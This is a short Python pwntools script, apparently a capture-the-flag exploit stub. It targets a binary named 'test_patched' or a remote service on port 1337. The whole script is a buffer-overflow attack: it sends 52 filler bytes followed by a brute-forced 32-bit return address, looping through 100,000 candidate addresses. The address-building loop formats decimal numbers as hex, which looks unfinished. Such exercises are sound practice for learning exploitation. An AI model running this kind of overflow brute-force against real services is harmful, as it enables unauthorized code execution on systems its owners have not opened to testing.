#!/usr/bin/env python3

from pwn import *

exe = ELF("./test_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r

r = conn()
def test(payload):
    r.sendlineafter("> ", payload)


def main():
    for a in range(100000):
        address = f"0x{a}299"
        # print(address)
        payload = flat(
            "A" * 52,
            p32(int(address, 16))
        )
        test(payload)



    # good luck pwning :)

    


if __name__ == "__main__":
    main()
